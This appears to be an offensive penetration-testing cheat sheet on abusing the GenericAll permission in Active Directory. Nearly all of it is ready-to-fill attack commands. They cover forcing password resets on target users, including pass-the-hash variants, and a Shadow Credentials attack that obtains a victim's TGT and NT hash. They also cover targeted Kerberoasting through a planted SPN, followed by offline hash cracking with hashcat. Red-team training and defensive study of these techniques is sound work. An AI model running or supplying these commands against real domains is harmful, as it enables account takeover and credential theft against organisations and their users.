# GenericAll

### Force Change Password

{% tabs %}
{% tab title="BloodyAD" %}
```shellscript
# With password
bloodyAD --host <COMPUTER> -d "<DOMAIN>" -u "<CONTROLLED_USER>" -p <PASSWORD> set password "<TARGET_USER>" "<NEW_PASSWORD>"

# With NT hash
bloodyAD --host <COMPUTER> -d "<DOMAIN>" -u "<CONTROLLED_USER>" -p :<NT_HASH> set password "<TARGET_USER>" "<NEW_PASSWORD>"
```
{% endtab %}

{% tab title="Net" %}
```shellscript
# With password
net rpc password "<TARGET_USER>" '<NEW_PASSWORD>' -U "<DOMAIN>"/"<CONTROLLED_USER>"%"<PASSWORD>" -S "<DC>"

# With hash
https://github.com/byt3bl33d3r/pth-toolkit
pth-net rpc password "<TARGET_USER>" '<NEW_PASSWORD>' -U "<DOMAIN>"/"<CONTROLLED_USER>"%"ffffffffffffffffffffffffffffffff":"<NT_HASH>" -S "<DC>"
```
{% endtab %}

{% tab title="PowerView" %}
```ps1
# Authenticate as the user who can change the password of the target 
$SecPassword = ConvertTo-SecureString '<CONTROLLED_USER_PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<CONTROLLER_USER>', $SecPassword)

# Create an object containing the target new password and change it
$TargetPassword = ConvertTo-SecureString '<NEW_TARGET_PASSWORD>' -AsPlainText -Force
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $TargetPassword -Credential $Cred -Verbose
```
{% endtab %}
{% endtabs %}

### Shadow Credentials attack

PKINIT, short for `Public Key Cryptography for Initial Authentication`, is an extension of the Kerberos protocol that enables the use of public key cryptography during the initial authentication exchange. It is typically used to support user logons via smart cards, which store the private keys

Shadow Credentials refers to an Active Directory attack that abuses the `msDS-KeyCredentialLink` attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT

This way, an attacker can write his key to the target, request a TGT as the target, and pass the ticket

{% tabs %}
{% tab title="Certipy" %}
```shellscript
# Automated process
certipy-ad shadow auto -u "<CONTROLLED_USER>"@"<DOMAIN>" -p "<PASSWORD>" -account "<TARGET_USER>"                 
```
{% endtab %}

{% tab title="Pywhisker" %}
```shellscript
# Generate a public-private key pair and adds a new key credential to the target
python3 pywhisker.py --dc-ip <DC> -d <DOMAIN> -u <CONTROLLER_USER> -p '<PASSWORD>' --target <TARGET_USER> --action add

# Request a TGT as the victim
python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass '<PFX_PASSWORD>' -dc-ip <DC> <DOMAIN>/<TARGET_USER> <OUTPUT_CCACHE>

# Unprotect the certificate using Certipy, as it cannot handle password-protected certificates for authentication
certipy-ad cert -export -pfx "<PFX_FILE>" -password "<PFX_PASSWORD>" -out unprotected_pfx.pfx

# Dump the hash of the user
certipy-ad auth -pfx unprotected_pfx.pfx -username "<TARGET_USER>" -domain "<DOMAIN>" -dc-ip <DC_IP>
```
{% endtab %}
{% endtabs %}

In certain environments, an attacker may be able to obtain a certificate but be unable to use it for pre-authentication as specific victims (e.g., a domain controller machine account) due to the KDC not supporting the appropriate EKU. The tool [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) was created for such situations. It can be used to authenticate against LDAPS using a certificate and perform various attacks (e.g., changing passwords or granting DCSync rights). This attack is outside the scope of this module but is worth reading about [here](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html).

{% embed url="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html" %}

{% embed url="https://github.com/AlmondOffSec/PassTheCert/" %}

### Targeted Kerberoast

{% tabs %}
{% tab title="targetedKerberoast.py" %}
```shellscript
python3 targetedKerberoast.py -v -d '<DOMAIN>' -u '<CONTROLLED_USER>' -p '<PASSWORD>'
```
{% endtab %}

{% tab title="BloodyAD & Netexec" %}
```shellscript
# Manually set an SPN. When using kerberos and PtH, we need to specify the hash
# format and get rid of the : before the hash
bloodyAD -d <DOMAIN> --host <COMPUTER> -u '<USER>' -p <PASSWORD> set object <TARGET> servicePrincipalName -v '<DOMAIN>/meow'
bloodyAD -d <DOMAIN> --host <COMPUTER> -u '<USER>' -k -p <HASH> -f rc4 set object <TARGET> servicePrincipalName -v '<DOMAIN>/meow'
# Retreive the hash
nxc ldap <DC> -u '<USER>' -p <PASSWORD> --kerberoast <OUTPUT>
```
{% endtab %}

{% tab title="PowerView & Rubeus" %}
```shellscript
# Authenticate as the user who can change the password of the target 
$SecPassword = ConvertTo-SecureString '<CONTROLLED_USER_PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<CONTROLLED_USER>', $SecPassword)

# Set the SPN
Set-DomainObject -Credential $Cred -Identity <TARGET> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# Retreive the hash
.\Rubeus.exe kerberoast /user:<TARGET> /nowrap
```
{% endtab %}
{% endtabs %}

Crack the obtained hash

```shellscript
hashcat -m 13100 <HASH> <WORDLIST>
```
